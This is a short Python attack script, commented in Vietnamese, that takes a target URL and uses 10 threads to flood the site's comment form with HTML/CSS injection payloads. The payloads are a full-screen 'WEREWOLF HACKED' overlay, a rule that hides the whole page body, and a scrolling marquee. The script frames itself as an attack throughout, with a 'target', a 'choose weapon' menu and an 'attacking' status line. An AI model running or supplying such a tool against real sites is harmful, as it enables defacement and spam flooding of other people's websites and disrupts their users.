import requests
import threading
import random
import time
import sys

# 1. Danh sách Payload HTML + CSS cực mạnh
PAYLOADS = {
    "1": "<h1 style='color:red;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:999999;font-size:100px;background:black;'>WEREWOLF HACKED</h1>",
    "2": "<style>body{display:none !important;}</style>", # Xóa sạch giao diện web
    "3": "<marquee scrollamount='50'><h1>WEREWOLF IS EVERYWHERE!!!</h1></marquee>"
}

def attack_worker(url, payload, stop_event):
    """Một 'con sói' con trong đàn tấn công"""
    while not stop_event.is_set():
        try:
            # Gửi gói tin tiêm HTML/CSS
            requests.post(url, data={'comment': payload, 'user': 'Werewolf'}, timeout=5)
            # Nghỉ một chút để điện thoại không bị nóng máy
            time.sleep(0.1) 
        except:
            pass

def main():
    if len(sys.argv) < 2:
        print("Thiếu URL mục tiêu!")
        return

    target = sys.argv[1]
    print(f"\n[🔥] MỤC TIÊU: {target}")
    print("\n--- CHỌN VŨ KHÍ ---")
    print("1. Hiển thị thông báo đỏ (HTML/CSS Overlay)")
    print("2. Xóa sạch giao diện đối phương (CSS Stealth)")
    print("3. Chạy chữ đuổi bắt (Marquee Chaos)")
    
    choice = input("\n[?] Chọn số (1/2/3): ")
    payload = PAYLOADS.get(choice, PAYLOADS["1"])

    # Thiết lập đa luồng (10 luồng là mức mượt cho điện thoại)
    stop_event = threading.Event()
    threads = []
    
    print(f"\n[*] Đang thả 10 'con sói' đa luồng vào cuộc săn...")
    for i in range(10):
        t = threading.Thread(target=attack_worker, args=(target, payload, stop_event))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        while True:
            time.sleep(1)
            print(f"[+] Đang tấn công... (Nhấn Ctrl+C để dừng và cứu điện thoại)")
    except KeyboardInterrupt:
        print("\n[!] Đang thu quân, dừng tấn công để hạ nhiệt máy...")
        stop_event.set()

if __name__ == "__main__":
    main()
    
